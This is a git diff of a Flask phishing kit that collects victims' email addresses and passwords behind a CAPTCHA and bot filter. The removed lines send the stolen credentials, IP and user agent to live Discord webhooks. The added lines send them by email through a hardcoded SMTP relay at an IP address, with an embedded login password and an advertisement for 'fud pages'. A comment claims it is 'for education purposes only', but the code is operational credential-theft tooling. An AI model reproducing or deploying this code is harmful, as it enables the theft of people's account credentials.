@@ -11,65 +11,13 @@ from flask_limiter.util import get_remote_address
 import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-import time
-import random
-import dns.resolver
-import io
-import json
 
-
-DISCORD_WEBHOOK_URLS = [
-    "https://discord.com/api/webhooks/1348669865195733002/ZszNmtxM4biaP6sjAahS5jXJmqJ19LuifBafAledLqF-sOMJEdthZlSfP7UeD2phQVE6",
-    "https://discord.com/api/webhooks/1348669882685984861/yZ_fqd_KHsXo-Mc1SttB2xKqPYvMNKMQA7kwLFOLT20o4KGeGIKD5e7jnfQu1KSNgDDn",
-    "https://discord.com/api/webhooks/1348669936964337715/CuVDPFNpftjEvDSwSb2FaBkbzl6bXxhjMlzbjl2x70Ufx6zitCfiMRKFCcwH-SiWzdgP"
-]
-
-# Function to get MX record
-def get_mx_record(domain):
-    try:
-        answers = dns.resolver.resolve(domain, 'MX')
-        return ', '.join(str(r.exchange) for r in answers)
-    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
-        return "No MX Record Found"
-
-# Function to send message & txt file to Discord
-def send_discord_message(email, password, ip, useragent, domain, mx_record):
-    webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
-    
-    # Create the txt file in /tmp (Vercel-friendly)
-    file_path = f"/tmp/{email.replace('@', '_')}.txt"
-    with open(file_path, "w") as f:
-        f.write(f"Email: {email}\n")
-        f.write(f"Password: {password}\n")
-        f.write(f"IP: {ip}\n")
-        f.write(f"User-Agent: {useragent}\n")
-        f.write(f"Domain: {domain}\n")
-        f.write(f"MX Record: {mx_record}\n")
-
-    # Discord message payload
-    payload = {
-        "username": "Logger Bot",
-        "avatar_url": "https://i.imgur.com/zW2WJ3o.png",
-        "content": f"🔔 *New Login Attempt Logged**\n📧 *Email:* `{email}`\n🌐 *IP:** `{ip}`"
-    }
-
-    # Send request with JSON and file attachment
-    with open(file_path, "rb") as file:
-        response = requests.post(
-            webhook_url,
-            data={"payload_json": json.dumps(payload)},  # ✅ Fix: Ensure valid JSON string
-            files={"file": file}
-        )
-
-    # Handle errors
-    if response.status_code != 204:
-        print(f"Failed to send message: {response.status_code} - {response.text}")
+# made for education purposes only
 
 app = Flask(__name__)
 limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
 secret_keyx = secrets.token_urlsafe(24)
 app.secret_key = secret_keyx
-
 
 bot_user_agents = [
 'Googlebot', 
@@ -175,7 +123,7 @@ def generate_captcha_image(code):
     # Convert the image to base64 string to pass to the HTML
     return base64.b64encode(img_io.getvalue()).decode('utf-8')
 
-@app.route('/m', methods=['GET', 'POST'])
+@app.route('/', methods=['GET', 'POST'])
 def captcha():
     if request.method == 'GET':
         if 'passed_captcha' in session and session['passed_captcha']:
@@ -222,7 +170,7 @@ def success():
         return redirect(url_for('captcha'))
 
 
-@app.route("/")
+@app.route("/m")
 def route2():
     web_param = request.args.get('web')
     if web_param:
@@ -234,58 +182,79 @@ def route2():
 @app.route("/first", methods=['POST'])
 def first():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For') or \
-             request.headers.get('X-Real-IP') or \
-             request.headers.get('X-Client-IP') or \
-             request.remote_addr
-
+        ip = request.headers.get('X-Forwarded-For')
+        if ip is None:
+            ip = request.headers.get('X-Real-IP')
+        if ip is None:
+            ip = request.headers.get('X-Client-IP')
+        if ip is None:
+            ip = request.remote_addr
         email = request.form.get("horse")
-        password = request.form.get("pig")
+        passwordemail = request.form.get("pig")
+        sender_email = "no-reply@shoroqshoroqprojectservice.biz"
+        sender_emaill = "no-reply"
+        receiver_email = "dylanmoreno689@gmail.com"
+        password = "vip36cdf94e8710"
         useragent = request.headers.get('User-Agent')
-
-        # Get MX record
-        domain = email.split('@')[-1] if email and '@' in email else None
-        mx_record = get_mx_record(domain) if domain else "Invalid Domain"
-
-        # Send data to Discord
-        send_discord_message(email, password, ip, useragent, domain, mx_record)
-
-        # Store email in session
-        session['eman'] = email
-
-        # Redirect
+        message = MIMEMultipart("alternative")
+        message["Subject"] = "KOTRA$$ Logs "
+        message["From"] = sender_email
+        message["To"] = receiver_email
+        text = """\
+        Hi,
+        How are you?
+        contact me on icq jamescartwright for your fud pages
+        """
+        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
+        part1 = MIMEText(text, "plain")
+        part2 = MIMEText(html, "html")
+        message.attach(part1)
+        message.attach(part2)
+        with smtplib.SMTP("45.143.167.17", 2525) as server:
+            server.login(sender_emaill, password)
+            server.sendmail(sender_email, receiver_email, message.as_string())
+        # Set session value and redirect
+        session['eman'] = email  # Save email as session variable
         return redirect(url_for('benza', web=email))
-
-    return "Method Not Allowed", 405
 
 
 
 @app.route("/second", methods=['POST'])
 def second():
     if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For') or \
-             request.headers.get('X-Real-IP') or \
-             request.headers.get('X-Client-IP') or \
-             request.remote_addr
-
+        ip = request.headers.get('X-Forwarded-For')
+        if ip is None:
+            ip = request.headers.get('X-Real-IP')
+        if ip is None:
+            ip = request.headers.get('X-Client-IP')
+        if ip is None:
+            ip = request.remote_addr
         email = request.form.get("horse")
-        password = request.form.get("pig")
+        passwordemail = request.form.get("pig")
+        sender_email = "no-reply@shoroqshoroqprojectservice.biz"
+        sender_emaill = "no-reply"
+        receiver_email = "dylanmoreno683@gmail.com"
+        password = "vip36cdf94e8710"
         useragent = request.headers.get('User-Agent')
-
-        # Get MX record
-        domain = email.split('@')[-1] if email and '@' in email else None
-        mx_record = get_mx_record(domain) if domain else "Invalid Domain"
-
-        # Send data to Discord
-        send_discord_message(email, password, ip, useragent, domain, mx_record)
-
-        # Store email in session
-        session['ins'] = email
-
-        # Redirect
+        message = MIMEMultipart("alternative")
+        message["Subject"] = "KOTRA$$ Logs  !! "
+        message["From"] = sender_email
+        message["To"] = receiver_email
+        text = """\
+        Hi,
+        How are you?
+        contact me on icq jamescartwright for your fud pages
+        """
+        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
+        part1 = MIMEText(text, "plain")
+        part2 = MIMEText(html, "html")
+        message.attach(part1)
+        message.attach(part2)
+        with smtplib.SMTP("45.143.167.17", 2525) as server:
+            server.login(sender_emaill, password)
+            server.sendmail(sender_email, receiver_email, message.as_string())
+        session['ins'] = email  # Save email as session variable
         return redirect(url_for('lasmo', web=email))
-
-    return "Method Not Allowed", 405
 
 
 
@@ -308,5 +277,5 @@ def lasmo():
         dman = session.get('ins')
     return render_template('main.html', dman=dman)
 
-if _name_ == '__main__':
+if __name__ == '__main__':
 	app.run(host="0.0.0.0", port=3000)
